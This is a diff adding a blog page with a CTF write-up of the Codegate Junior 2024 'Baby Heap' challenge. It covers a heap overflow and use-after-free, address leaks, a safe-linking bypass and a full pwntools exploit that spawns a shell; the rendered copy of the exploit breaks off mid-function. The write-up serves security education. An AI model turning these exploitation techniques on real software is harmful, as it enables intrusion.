@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>CodegateJunior24 - Baby Heap | leo_something</title>
+<meta name="keywords" content="pwn, heap">
+<meta name="description" content="Heap challenge from the Codegate quals for juniors of 2024. The vulnerability was an heap overflow that enabled an attacker to gain overlapping chunks, therefore arb read and write.">
+<meta name="author" content="leo_something">
+<link rel="canonical" href="http://leo1.cc:5555/posts/writeups/codegatejunior24-baby_heap/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.0c2131417d0b88f5928cdb2549da0d09bb391dae4fb3114012aa1349b07d4a44.css" integrity="sha256-DCExQX0LiPWSjNslSdoNCbs5Ha5PsxFAEqoTSbB9SkQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://leo1.cc:5555/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://leo1.cc:5555/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://leo1.cc:5555/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://leo1.cc:5555/apple-touch-icon.png">
+<link rel="mask-icon" href="http://leo1.cc:5555/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://leo1.cc:5555/posts/writeups/codegatejunior24-baby_heap/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="http://leo1.cc:5555/posts/writeups/codegatejunior24-baby_heap/">
+  <meta property="og:site_name" content="leo_something">
+  <meta property="og:title" content="CodegateJunior24 - Baby Heap">
+  <meta property="og:description" content="Heap challenge from the Codegate quals for juniors of 2024. The vulnerability was an heap overflow that enabled an attacker to gain overlapping chunks, therefore arb read and write.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-06-03T12:02:00+00:00">
+    <meta property="article:modified_time" content="2024-06-03T12:02:00+00:00">
+    <meta property="article:tag" content="Pwn">
+    <meta property="article:tag" content="Heap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CodegateJunior24 - Baby Heap">
+<meta name="twitter:description" content="Heap challenge from the Codegate quals for juniors of 2024. The vulnerability was an heap overflow that enabled an attacker to gain overlapping chunks, therefore arb read and write.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://leo1.cc:5555/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CodegateJunior24 - Baby Heap",
+      "item": "http://leo1.cc:5555/posts/writeups/codegatejunior24-baby_heap/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CodegateJunior24 - Baby Heap",
+  "name": "CodegateJunior24 - Baby Heap",
+  "description": "Heap challenge from the Codegate quals for juniors of 2024. The vulnerability was an heap overflow that enabled an attacker to gain overlapping chunks, therefore arb read and write.",
+  "keywords": [
+    "pwn", "heap"
+  ],
+  "articleBody": "BINARY OVERVIEW Baby Heap is a simple heap based 64 bit binary, when executed it gives the user 5 options:\nadd (create a chunk of a specified size and initialize it with the provided data) free (free a chunk) modify (modify the data of a chunk (max 40 bytes)) view (print the data contained in a chunk) exit (return from main) REVERSE ENGINEERING After trying every feature of the binary I opened it up in Ida (which usually gives the best decompiled code for x86_64bit binaries) and started to reverse the different functionalities of the program.\nADD From this function I understood 3 really important mechanics of the binary:\nWe can allocate max 15 chunks (the number of allocated chunks is saved in a global variable)\nEvery chunk we allocate is basically a “struct” (chunk of size 0x20) containing data size, a “is_used” flag and a pointer to a chunk containing the data itself.\n------------------------- | CHUNCK METADATA | ------------- ----------- | data_size | is_used | ------------- ----------- | data_chunck | | ------------------------- Structure of the chunk containing the “struct”\nEvery time a chunk is created the pointer to its “struct” is saved in a global array\nThe size of data can be max 199, so the bigger chunk we can allocate is 208 bytes big\nNOTE: Hereinafter I will use these words:\nstruct to talk about the “struct” explained above (chunk of size 0x20) chunk_num is the global variable containing the number of allocated chunks chunk_list is the global array containing the pointers to the structs is_used is the flag that determines if a chunk is free or allocated data_chunk is the chunk containing the data data_size is the number of bytes of data FREE This function might seem well implemented (it sets is_used to 0, frees data_chunk and removes its pointer from the relative struct and finally frees the struct itself). After a closer look I spotted the following issues:\nchunk_num is never decremented struct pointer is never removed from chunk_list (can lead to UAF) MODIFY This function holds the main vulnerability of the binary:\nread(0, data_chunk, 0x28); Basically you can write 40 bytes into the data chunk, but if the chunk is smaller than 0x28 we can overflow into the next chunk and manipulate its metadata.\nVIEW This simply prints the data of a chunk given its index in chunk_list. Note that it prints data_size bytes, so if we want to read more than our data we will need to tamper data_size field in struct.\nEXPLOITATION First steps First thing to do before even dreaming of exploiting this thing is getting the libc version, it can easily be copied from the docker image.\n$ docker pull ubuntu:22.04@sha256:a6d2b38300ce017add71440577d5b0a90460d0e57fd7aec21dd0d1b0761bbfb2 $ docker images REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu 52882761a72a 5 weeks ago 77.9MB $ docker cp \"$(docker create 52882761a72a):/usr/lib/x86_64-linux-gnu/libc.so.6\" \"./\" Successfully copied 6.47MB to ./ Then I patched the binary with:\n$ pwninit --bin=chall --libc=./libc.so.6 I also used checksec to find out that all the protections on the binary are enabled. :(\nLeaking stuff Knowing that we can mess with the metadata of a chunk just by modifying the chunk above, I overrode the size field of a chunk making it bigger, overlapping the chunks after it, this way I was able to leak heap and libc. The path I took was this:\nallocate three 0x20 chunks to be overflown later allocate six chunks of the maximum size allowed (0xd0), they will be overlapped by a big chunk of size 0x4f0 (which goes into unsortedbins when freed). free one of the 0xd0 chunks (the fd of this chunk will be used to leak the heap) overflow a 0x20 chunk to change the size of the chunk after it to make it bigger, overlapping all the chunks after. We also override the data_size of struct to be able to read after data_chunk. now, reading from this chunk would let us leak the fd of the freed chunk, from that we can calculate the heap address, bypassing safe linking with fd \u003c\u003c 12 . as the big chunk we created is of size 0x4f0 it will go into unsortedbins when freed and its fd will point to libc main arena. tampering the data_size of the chunk before the big chunk we can read the fd of the big chunk, leaking libc. As my final goal is to ROP on the stack we will also need to leak the stack, to do that we can exploit the UAF primitive to allocate a chunk over environ and read from it.\nUAF to spawn a shell Now that we leaked all we needed we can hopefully write a ROP chain on the stack and spawn a sheel. To do that I abused the UAF to allocate a chunk over the old_rbp on the stack, overriding it with a pointer to a well chosen location on the heap so as to have the perfect constraints for a onegadget. Finally I placed the onegadget over the retaddr on the stack and used option 5 (EXIT) to make the program return to the onegadget.\nNOTE: The choice of using a onegadget is due to the fact that we can only exploit the UAF on 0x20 chunks, so we have restricted space to write our ROP chain.\nProblems I faced Obviously the exploit didn’t work first try, the main problems I faced are the following:\ninitially I couldn’t free the big chunk because I allocated it over the top chunk and this caused a corruption to the top chunk’s metadata, making the binary crash. I spent a hell of a lot of time understanding why the free function was inserting into tcachebins two chunks at a time, that is obviously caused by the fact that an “allocated chunk” is composed of two chunks: struct and data_chunk. heap chunks must be aligned by 16 bytes (last 4 bits of the address must be set to 0), so we cannot allocate directly over the retaddr because it is not aligned. safe linking is enabled in the libc version used by the binary, so we need to calculate the correct pointer to put in fd, I used the following function: def calculate_P1(P, L): L12 = L \u003e\u003e 12 P = P.to_bytes(8, \"big\") L12 = L12.to_bytes(8, \"big\") return int(bytes([p^l12 for p,l12 in zip(P,L12)]).hex(), 16) Final Exploit #!/usr/bin/env python3 from pwn import * exe = ELF(\"chall_patched\") libc = ELF(\"libc.so.6\") ld = ELF(\"./ld-2.35.so\") context.binary = exe context.terminal = [\"alacritty\", \"-e\"] def conn(): if args.LOCAL: r = process([exe.path]) elif args.GDB: r = gdb.debug([exe.path]) else: r = remote(\"13.125.233.58\", 7331) return r r = conn() def get_heap_base(Pprime): Pprime_byte = 0 xor_byte = 0 decoded = Pprime \u003e\u003e 36 for i in range(3): Pprime_byte = Pprime \u003e\u003e (28 - i*8) xor_byte = Pprime_byte ^ (decoded \u003e\u003e 4) decoded = decoded \u003c\u003c 8 decoded |= xor_byte return decoded \u003c\u003c 12 def calculate_P1(P, L): L12 = L \u003e\u003e 12 P = P.to_bytes(8, \"big\") L12 = L12.to_bytes(8, \"big\") return int(bytes([p^l12 for p,l12 in zip(P,L12)]).hex(), 16) def add(size, data): r.sendlineafter(b\"\u003e\u003e\", b\"1\") r.sendlineafter(b\":\", str(size).encode()) r.sendafter(b\":\", data) def free(idx): r.sendlineafter(b\"\u003e\u003e\", b\"2\") r.sendlineafter(b\":\", str(idx).encode()) def modify(idx, data): assert len(data) \u003c= 40 r.sendlineafter(b\"\u003e\u003e\", b\"3\") r.sendlineafter(b\":\", str(idx).encode()) r.sendafter(b\":\", data) def view(idx): r.sendlineafter(b\"\u003e\u003e\", b\"4\") r.sendlineafter(b\":\", str(idx).encode()) return r.recvuntil(b\"1. add\")[1:-6] def main(): add(16, b\"a\"*16) add(16, b\"b\"*16) add(16, b\"c\"*16) for _ in range(6): add(199, b\"x\"*199) free(3) # chunk for heap leak # leak libc and heap abusing chunk overlapping and unsortedbins payload = b\"c\"*16 + b\"\\x00\"*8 + p64(0x4f1) + p64(40) modify(1, payload) heap = u64(view(2)[-8:]) \u003c\u003c 12 log.warning(f\"heap: {hex(heap)}\") free(2) # free big chunk into unsortedbins payload = b\"b\"*16 + b\"\\x00\"*8 + p64(0x21) + p64(40) modify(0, payload) libc.address = u64(view(1)[-8:]) - (libc.sym[\"main_arena\"] + 96) log.warning(f\"libc: {hex(libc.address)}\") payload = b\"c\"*16 + b\"\\x00\"*8 + p64(0x21) + p64(16) modify(0, payload) # leak stack (environ) payload = b\"b\"*16 + b\"\\x00\"*8 + p64(0x81) + p64(32) modify(4, payload) free(4) payload = p64(0x10) + p64(1) + p64(libc.sym[\"environ\"]) add(120, payload) retaddr = u64(view(2)[:8]) - 0x120 log.warning(f\"stack: {hex(retaddr)}\") free(9) # ROP on the stack payload = ( b\"y\"*16 + p64(0) + p64(0x61) + p64(calculate_P1(retaddr-8, heap+0x378)) + p64(heap+0x388) + # goes in rbp (tweak for onegadet) p64(heap+0x390) + p64(0)*2 ) add(120, payload) ONE_GADGET = libc.address + 0xebd3f rbp = p64(heap+0x380) retaddr = p64(ONE_GADGET) add(16, rbp + retaddr) r.sendlineafter(b\"\u003e\u003e\", b\"5\") # exit to trigger onegadget r.interactive() if __name__ == \"__main__\": main() FLAG: codegate2024{f0de50c65021e07779d3cde7576c4fbe519e6412ad7de1ee743abd08b5b435844184c2295ff705f54b55790a454c427b8faf1d65bbf1f4e19df0c5613d36b0}\n",
+  "wordCount" : "1384",
+  "inLanguage": "en",
+  "datePublished": "2024-06-03T12:02:00Z",
+  "dateModified": "2024-06-03T12:02:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "leo_something"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://leo1.cc:5555/posts/writeups/codegatejunior24-baby_heap/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "leo_something",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://leo1.cc:5555/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://leo1.cc:5555/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://leo1.cc:5555/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://leo1.cc:5555/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://leo1.cc:5555/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      CodegateJunior24 - Baby Heap
+    </h1>
+    <div class="post-meta"><span title='2024-06-03 12:02:00 +0000 UTC'>June 3, 2024</span>&nbsp;·&nbsp;leo_something
+
+</div>
+  </header>
+  <div class="tags" style="padding: 2px;">
+    <div style="display: flex; flex-wrap: wrap; gap: 5px;">
+      
+      <a href="/tags/pwn" class="custom-tag">
+        pwn
+      </a>
+      
+      <a href="/tags/heap" class="custom-tag">
+        heap
+      </a>
+      
+    </div>
+  </div>
+
+  <div style="height: var(--gap);"></div> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#binary-overview" aria-label="BINARY OVERVIEW">BINARY OVERVIEW</a></li>
+                <li>
+                    <a href="#reverse-engineering" aria-label="REVERSE ENGINEERING">REVERSE ENGINEERING</a><ul>
+                        <ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#add" aria-label="ADD">ADD</a></li>
+                <li>
+                    <a href="#free" aria-label="FREE">FREE</a></li>
+                <li>
+                    <a href="#modify" aria-label="MODIFY">MODIFY</a></li>
+                <li>
+                    <a href="#view" aria-label="VIEW">VIEW</a></li></ul>
+                    </ul>
+                    </ul>
+                </li>
+                <li>
+                    <a href="#exploitation" aria-label="EXPLOITATION">EXPLOITATION</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#first-steps" aria-label="First steps">First steps</a></li>
+                <li>
+                    <a href="#leaking-stuff" aria-label="Leaking stuff">Leaking stuff</a></li>
+                <li>
+                    <a href="#uaf-to-spawn-a-shell" aria-label="UAF to spawn a shell">UAF to spawn a shell</a></li>
+                <li>
+                    <a href="#problems-i-faced" aria-label="Problems I faced">Problems I faced</a></li>
+                <li>
+                    <a href="#final-exploit" aria-label="Final Exploit">Final Exploit</a>
+                </li>
+            </ul>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="binary-overview">BINARY OVERVIEW<a hidden class="anchor" aria-hidden="true" href="#binary-overview">#</a></h2>
+<p>Baby Heap is a simple heap based 64 bit binary, when executed it gives the user 5 options:</p>
+<ol>
+<li>add (create a chunk of a specified size and initialize it with the provided data)</li>
+<li>free (free a chunk)</li>
+<li>modify (modify the data of a chunk (max 40 bytes))</li>
+<li>view (print the data contained in a chunk)</li>
+<li>exit (return from main)</li>
+</ol>
+<hr>
+<h2 id="reverse-engineering">REVERSE ENGINEERING<a hidden class="anchor" aria-hidden="true" href="#reverse-engineering">#</a></h2>
+<p>After trying every feature of the binary I opened it up in Ida (which usually gives the best decompiled code for x86_64bit binaries) and started to reverse the different functionalities of the program.</p>
+<h5 id="add">ADD<a hidden class="anchor" aria-hidden="true" href="#add">#</a></h5>
+<p>From this function I understood 3 really important mechanics of the binary:</p>
+<ul>
+<li>
+<p>We can allocate max 15 chunks (the number of allocated chunks is saved in a global variable)</p>
+</li>
+<li>
+<p>Every chunk we allocate is basically a &ldquo;struct&rdquo; (chunk of size 0x20) containing data size, a &ldquo;is_used&rdquo; flag and a pointer to a chunk containing the data itself.</p>
+<pre tabindex="0"><code> -------------------------
+|     CHUNCK METADATA     |
+ ------------- -----------
+|  data_size  |  is_used  |
+ ------------- -----------
+| data_chunck |           |
+ -------------------------
+</code></pre><p><em>Structure of the chunk containing the &ldquo;struct&rdquo;</em></p>
+</li>
+<li>
+<p>Every time a chunk is created the pointer to its &ldquo;struct&rdquo; is saved in a global array</p>
+</li>
+<li>
+<p>The size of data can be max 199, so the bigger chunk we can allocate is 208 bytes big</p>
+</li>
+</ul>
+<p><strong>NOTE</strong>:
+Hereinafter I will use these words:</p>
+<ul>
+<li><code>struct</code> to talk about the &ldquo;struct&rdquo; explained above (chunk of size 0x20)</li>
+<li><code>chunk_num</code> is the global variable containing the number of allocated chunks</li>
+<li><code>chunk_list</code> is the global array containing the pointers to the structs</li>
+<li><code>is_used</code> is the flag that determines if a chunk is free or allocated</li>
+<li><code>data_chunk</code> is the chunk containing the data</li>
+<li><code>data_size</code> is the number of bytes of data</li>
+</ul>
+<h5 id="free">FREE<a hidden class="anchor" aria-hidden="true" href="#free">#</a></h5>
+<p>This function might seem well implemented (it sets <code>is_used</code> to 0, frees <code>data_chunk</code> and removes its pointer from the relative <code>struct</code> and finally frees the <code>struct</code> itself).
+After a closer look I spotted the following issues:</p>
+<ul>
+<li><code>chunk_num</code> is never decremented</li>
+<li><code>struct</code> pointer is never removed from <code>chunk_list</code> (can lead to UAF)</li>
+</ul>
+<h5 id="modify">MODIFY<a hidden class="anchor" aria-hidden="true" href="#modify">#</a></h5>
+<p>This function holds the main vulnerability of the binary:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, data_chunk, <span style="color:#ae81ff">0x28</span>);
+</span></span></code></pre></div><p>Basically you can write 40 bytes into the data chunk, but if the chunk is smaller than 0x28 we can overflow into the next chunk and manipulate its metadata.</p>
+<h5 id="view">VIEW<a hidden class="anchor" aria-hidden="true" href="#view">#</a></h5>
+<p>This simply prints the data of a chunk given its index in <code>chunk_list</code>. Note that it prints <code>data_size</code> bytes, so if we want to read more than our data we will need to tamper <code>data_size</code> field in <code>struct</code>.</p>
+<hr>
+<h2 id="exploitation">EXPLOITATION<a hidden class="anchor" aria-hidden="true" href="#exploitation">#</a></h2>
+<h4 id="first-steps">First steps<a hidden class="anchor" aria-hidden="true" href="#first-steps">#</a></h4>
+<p>First thing to do before even dreaming of exploiting this thing is getting the libc version, it can easily be copied from the docker image.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ docker pull ubuntu:22.04@sha256:a6d2b38300ce017add71440577d5b0a90460d0e57fd7aec21dd0d1b0761bbfb2
+</span></span><span style="display:flex;"><span>$ docker images
+</span></span><span style="display:flex;"><span>REPOSITORY                      TAG       IMAGE ID       CREATED         SIZE
+</span></span><span style="display:flex;"><span>ubuntu                          &lt;none&gt;    52882761a72a   <span style="color:#ae81ff">5</span> weeks ago     77.9MB
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ docker cp <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>docker create 52882761a72a<span style="color:#66d9ef">)</span><span style="color:#e6db74">:/usr/lib/x86_64-linux-gnu/libc.so.6&#34;</span> <span style="color:#e6db74">&#34;./&#34;</span>
+</span></span><span style="display:flex;"><span>Successfully copied 6.47MB to ./
+</span></span></code></pre></div><p>Then I patched the binary with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ pwninit --bin<span style="color:#f92672">=</span>chall --libc<span style="color:#f92672">=</span>./libc.so.6
+</span></span></code></pre></div><p>I also used <code>checksec</code> to find out that all the protections on the binary are enabled. :(</p>
+<h4 id="leaking-stuff">Leaking stuff<a hidden class="anchor" aria-hidden="true" href="#leaking-stuff">#</a></h4>
+<p>Knowing that we can mess with the metadata of a chunk just by modifying the chunk above, I overrode the size field of a chunk making it bigger, overlapping the chunks after it, this way I was able to leak heap and libc.
+The path I took was this:</p>
+<ol>
+<li>allocate three 0x20 chunks to be overflown later</li>
+<li>allocate six chunks of the maximum size allowed (0xd0), they will be overlapped by a big chunk of size 0x4f0 (which goes into unsortedbins when freed).</li>
+<li>free one of the 0xd0 chunks (the <code>fd</code> of this chunk will be used to leak the heap)</li>
+<li>overflow a 0x20 chunk to change the size of the chunk after it to make it bigger, overlapping all the chunks after. We also override the <code>data_size</code> of <code>struct</code> to be able to read after <code>data_chunk</code>.</li>
+<li>now, reading from this chunk would let us leak the <code>fd</code> of the freed chunk, from that we can calculate the heap address, bypassing safe linking with <code>fd &lt;&lt; 12</code> .</li>
+<li>as the big chunk we created is of size 0x4f0 it will go into unsortedbins when freed and its <code>fd</code> will point to libc main arena.</li>
+<li>tampering the <code>data_size</code> of the chunk before the big chunk we can read the <code>fd</code> of the big chunk, leaking libc.</li>
+</ol>
+<p>As my final goal is to ROP on the stack we will also need to leak the stack, to do that we can exploit the UAF primitive to allocate a chunk over <code>environ</code> and read from it.</p>
+<h4 id="uaf-to-spawn-a-shell">UAF to spawn a shell<a hidden class="anchor" aria-hidden="true" href="#uaf-to-spawn-a-shell">#</a></h4>
+<p>Now that we leaked all we needed we can hopefully write a ROP chain on the stack and spawn a sheel.
+To do that I abused the UAF to allocate a chunk over the <code>old_rbp</code> on the stack, overriding it with a pointer to a well chosen location on the heap so as to have the perfect constraints for a onegadget. Finally I placed the onegadget over the <code>retaddr</code> on the stack and used option 5 (EXIT) to make the program return to the onegadget.</p>
+<p><strong>NOTE:</strong>
+The choice of using a onegadget is due to the fact that we can only exploit the UAF on 0x20 chunks, so we have restricted space to write our ROP chain.</p>
+<h4 id="problems-i-faced">Problems I faced<a hidden class="anchor" aria-hidden="true" href="#problems-i-faced">#</a></h4>
+<p>Obviously the exploit didn&rsquo;t work first try, the main problems I faced are the following:</p>
+<ul>
+<li>initially I couldn&rsquo;t free the big chunk because I allocated it over the top chunk and this caused a corruption to the top chunk&rsquo;s metadata, making the binary crash.</li>
+<li>I spent a hell of a lot of time understanding why the <code>free</code> function was inserting into tcachebins two chunks at a time, that is obviously caused by the fact that an &ldquo;allocated chunk&rdquo; is composed of two chunks: <code>struct</code> and <code>data_chunk</code>.</li>
+<li>heap chunks must be aligned by 16 bytes (last 4 bits of the address must be set to 0), so we cannot allocate directly over the <code>retaddr</code> because it is not aligned.</li>
+<li><a href="https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigation">safe linking</a> is enabled in the libc version used by the binary, so we need to calculate the correct pointer to put in <code>fd</code>, I used the following function:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calculate_P1</span>(P, L):
+</span></span><span style="display:flex;"><span>	L12 <span style="color:#f92672">=</span> L <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">12</span>
+</span></span><span style="display:flex;"><span>	P <span style="color:#f92672">=</span> P<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;big&#34;</span>)
+</span></span><span style="display:flex;"><span>	L12 <span style="color:#f92672">=</span> L12<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;big&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> int(bytes([p<span style="color:#f92672">^</span>l12 <span style="color:#66d9ef">for</span> p,l12 <span style="color:#f92672">in</span> zip(P,L12)])<span style="color:#f92672">.</span>hex(), <span style="color:#ae81ff">16</span>)
+</span></span></code></pre></div><h4 id="final-exploit">Final Exploit<a hidden class="anchor" aria-hidden="true" href="#final-exploit">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;chall_patched&#34;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;libc.so.6&#34;</span>)
+</span></span><span style="display:flex;"><span>ld <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ld-2.35.so&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;alacritty&#34;</span>, <span style="color:#e6db74">&#34;-e&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>GDB:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> gdb<span style="color:#f92672">.</span>debug([exe<span style="color:#f92672">.</span>path])
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;13.125.233.58&#34;</span>, <span style="color:#ae81ff">7331</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> conn()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_heap_base</span>(Pprime):
+</span></span><span style="display:flex;"><span>    Pprime_byte <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> 
+</span></span><span style="display:flex;"><span>    xor_byte <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    decoded <span style="color:#f92672">=</span> Pprime <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">36</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">3</span>):
+</span></span><span style="display:flex;"><span>        Pprime_byte <span style="color:#f92672">=</span> Pprime <span style="color:#f92672">&gt;&gt;</span> (<span style="color:#ae81ff">28</span> <span style="color:#f92672">-</span> i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span>        xor_byte <span style="color:#f92672">=</span> Pprime_byte <span style="color:#f92672">^</span> (decoded <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>        decoded <span style="color:#f92672">=</span> decoded <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>        decoded <span style="color:#f92672">|=</span> xor_byte
